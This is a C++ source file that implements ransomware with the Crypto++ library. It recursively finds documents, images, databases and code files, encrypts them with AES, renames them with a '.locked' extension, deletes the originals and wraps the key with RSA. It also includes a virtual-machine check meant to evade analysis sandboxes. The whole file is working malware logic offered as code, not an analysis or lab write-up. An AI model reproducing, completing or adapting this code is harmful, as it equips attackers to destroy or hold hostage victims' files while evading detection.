#include <cryptlib.h>
#include <aes.h>
#include <rsa.h>
#include <osrng.h>
#include <modes.h>
#include <filters.h>
#include <files.h>
#include <hex.h>

#include <windows.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <filesystem>
#include <regex>

using namespace CryptoPP;
namespace fs = std::filesystem;

const std::vector<std::string> TARGET_EXTENSIONS = { ".docx", ".pdf", ".xls", ".ppt", ".jpg", ".png", ".mp4", ".sql", ".cpp", ".py" };
const std::vector<std::string> EXCLUDE_KEYWORDS = { "winlogon.exe", ".dll", ".sys" };
const std::string LOG_FILE = "affected_files.log";

bool is_virtual_machine() {
    SYSTEM_INFO sysinfo;
    GetSystemInfo(&sysinfo);
    if (sysinfo.dwNumberOfProcessors <= 2)
        return true;

    MEMORYSTATUSEX memstat;
    memstat.dwLength = sizeof(memstat);
    GlobalMemoryStatusEx(&memstat);
    if (memstat.ullTotalPhys < (2ULL * 1024 * 1024 * 1024))
        return true;

    return false;
}

bool should_encrypt(const std::string& filename) {
    for (const auto& ex : EXCLUDE_KEYWORDS)
        if (filename.find(ex) != std::string::npos)
            return false;

    for (const auto& ext : TARGET_EXTENSIONS)
        if (filename.ends_with(ext))
            return true;

    return false;
}

void encrypt_file(const std::string& filepath, const SecByteBlock& key, const byte iv[16]) {
    try {
        std::string plain;
        FileSource(filepath.c_str(), true, new StringSink(plain));

        CBC_Mode<AES>::Encryption encryptor;
        encryptor.SetKeyWithIV(key, key.size(), iv);

        std::string cipher;
        StreamTransformationFilter filter(encryptor, new StringSink(cipher));
        filter.Put(reinterpret_cast<const byte*>(plain.data()), plain.size());
        filter.MessageEnd();

        std::string enc_file = filepath + ".locked";
        FileSink fs(enc_file.c_str());
        fs.Put((const byte*)cipher.data(), cipher.size());

        std::remove(filepath.c_str());

        std::ofstream log(LOG_FILE, std::ios::app);
        log << filepath << "\n";
    }
    catch (...) {
        std::cerr << "[!] Failed to encrypt: " << filepath << "\n";
    }
}

void encrypt_directory(const std::string& root, const SecByteBlock& key, const byte iv[16]) {
    for (const auto& entry : fs::recursive_directory_iterator(root)) {
        if (entry.is_regular_file()) {
            std::string path = entry.path().string();
            if (should_encrypt(path))
                encrypt_file(path, key, iv);
        }
    }
}

void rsa_encrypt_key(const SecByteBlock& aes_key, std::string& out_enc_key) {
    AutoSeededRandomPool rng;

    InvertibleRSAFunction privkey;
    privkey.Initialize(rng, 2048);

    RSA::PublicKey pubkey(privkey);

    RSAES_OAEP_SHA_Encryptor encryptor(pubkey);
    StringSource ss1(aes_key, aes_key.size(), true,
        new PK_EncryptorFilter(rng, encryptor,
            new StringSink(out_enc_key)
        )
    );

    FileSink("private.key").Put(privkey.GetModulus().BytePtr(), privkey.GetModulus().ByteCount());
}

int main() {
    if (is_virtual_machine()) {
        std::cout << "[!] Virtual environment detected. Exiting.\n";
        return 1;
    }

    AutoSeededRandomPool prng;
    SecByteBlock key(AES::DEFAULT_KEYLENGTH * 2); // 256-bit
    byte iv[AES::BLOCKSIZE]; // 128-bit

    prng.GenerateBlock(key, key.size());
    prng.GenerateBlock(iv, sizeof(iv));

    std::string encrypted_key;
    rsa_encrypt_key(key, encrypted_key);

    FileSink("aes_key.enc").Put((const byte*)encrypted_key.data(), encrypted_key.size());

    std::string target_dir = "C:\\TestEncrypt";
    encrypt_directory(target_dir, key, iv);

    std::cout << "[+] Files encrypted successfully.\n";
    return 0;
}
